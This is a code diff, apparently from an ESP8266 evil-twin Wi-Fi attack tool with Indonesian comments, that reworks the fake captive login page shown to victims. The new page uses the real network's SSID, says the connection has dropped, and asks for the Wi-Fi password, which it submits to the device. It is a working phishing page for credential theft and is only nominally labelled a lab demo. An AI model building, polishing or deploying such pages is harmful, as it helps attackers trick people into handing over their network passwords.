@@ -450,16 +450,60 @@ String panelHtml(){
 
 // halaman login yang dilihat korban (demo lab)
 String loginPage(){
-  String a = _selectedNetwork.ssid;
-  return String("<!DOCTYPE html><html><head><title>") + a + " :: Login</title>"
-    "<meta name=viewport content='width=device-width,initial-scale=1'>"
-    "<style>body{color:#333;font-family:Century Gothic,sans-serif;font-size:18px;margin:0}"
-    "nav{background:#dc214c;color:#fff;padding:1em;font-size:1.3em}"
-    "input{width:100%;padding:9px 10px;margin:8px 0;border:1px solid #1e31b5}"
-    "div{padding:.8em}</style></head><body><nav><b>" + a + "</b></nav>"
-    "<div><h1>Login</h1><p>Masukkan kata sandi WiFi untuk melanjutkan perbaikan sistem.</p>"
-    "<form action='/'><b>Password:</b><input type=password name=password>"
-    "<input type=submit value='Login'></form></div></body></html>";
+  String a = String(_selectedNetwork.ssid);
+  String h = R"HTML(<!DOCTYPE html><html lang="id"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>TITLE :: Login Jaringan</title><style>
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+background:linear-gradient(160deg,#eef2f7 0%,#dbe5f1 100%);font-family:-apple-system,"Segoe UI",Roboto,Arial,sans-serif;color:#1f2937}
+.card{width:min(92vw,380px);background:#fff;border-radius:14px;box-shadow:0 10px 30px rgba(15,40,80,.14);overflow:hidden}
+.head{background:#0b63c5;color:#fff;padding:22px 22px 18px;text-align:center}
+.icon{width:54px;height:54px;border-radius:50%;background:rgba(255,255,255,.16);margin:0 auto 10px;display:flex;align-items:center;justify-content:center}
+.icon svg{width:30px;height:30px;fill:#fff}
+h1{font-size:1.05rem;margin:0;font-weight:600}
+.head .ssid{margin:6px 0 0;font-size:.85rem;font-weight:700;letter-spacing:.02em}
+.head .sub{margin:2px 0 0;font-size:.75rem;opacity:.85}
+.body{padding:22px}
+label{display:block;font-size:.78rem;font-weight:600;color:#475569;margin-bottom:6px}
+.wrap{position:relative;margin-bottom:14px}
+input[type=password],input[type=text]{width:100%;padding:12px 44px 12px 12px;font-size:.95rem;
+border:1px solid #cbd5e1;border-radius:9px;outline:none;background:#fff}
+input:focus{border-color:#0b63c5;box-shadow:0 0 0 3px rgba(11,99,197,.13)}
+.eye{position:absolute;right:6px;top:50%;transform:translateY(-50%);border:0;background:none;
+color:#64748b;padding:8px;cursor:pointer;font-size:1rem;line-height:1}
+.row{display:flex;align-items:center;gap:8px;font-size:.8rem;color:#475569;margin:0 0 16px}
+.row input{width:auto}
+.row label{margin:0;font-weight:400;font-size:.8rem;color:#475569}
+.go{width:100%;padding:12px;border:0;border-radius:9px;background:#0b63c5;color:#fff;font-size:.95rem;font-weight:600;cursor:pointer}
+.go:active{background:#0952a3}
+.foot{padding:0 22px 18px;font-size:.7rem;color:#94a3b8;text-align:center;line-height:1.5}
+</style></head><body>
+<div class="card">
+  <div class="head">
+    <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 18.5a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3zm0-5.5c-1.9 0-3.6.8-4.8 2l1.6 1.6A5 5 0 0 1 12 15c1.2 0 2.3.5 3.2 1.1l1.6-1.6A6.9 6.9 0 0 0 12 13zm0-5C9.2 8 6.6 9.1 4.7 11l1.6 1.6A8.9 8.9 0 0 1 12 10c2.2 0 4.2.8 5.7 2.2l1.6-1.6A11 11 0 0 0 12 8zm0-5C8 3 4.3 4.6 1.6 7.3L3.2 9c2.2-2.2 5.3-3.5 8.8-3.5s6.6 1.3 8.8 3.5l1.6-1.6A14.9 14.9 0 0 0 12 3z"/></svg></div>
+    <h1>Login Jaringan</h1>
+    <p class="ssid">SSID</p>
+    <p class="sub">Koneksi terputus sementara</p>
+  </div>
+  <div class="body">
+    <form method="get" action="/">
+      <label for="pw">Kata sandi WiFi</label>
+      <div class="wrap">
+        <input id="pw" type="password" name="password" placeholder="Masukkan kata sandi" autofocus required>
+        <button class="eye" type="button" onclick="t()" aria-label="lihat">&#128065;</button>
+      </div>
+      <div class="row"><input type="checkbox" id="rm"><label for="rm">Ingat perangkat ini</label></div>
+      <button class="go" type="submit">Masuk</button>
+    </form>
+  </div>
+  <div class="foot">Masukkan kata sandi untuk menyambung kembali ke jaringan.</div>
+</div>
+<script>function t(){var i=document.getElementById('pw');i.type=i.type==='password'?'text':'password';}</script>
+</body></html>)HTML";
+  h.replace("SSID", a);      // String::replace() void di core ESP8266
+  h.replace("TITLE", a);
+  return h;
 }
 
 // ---------------- route -----------------------------------------------------
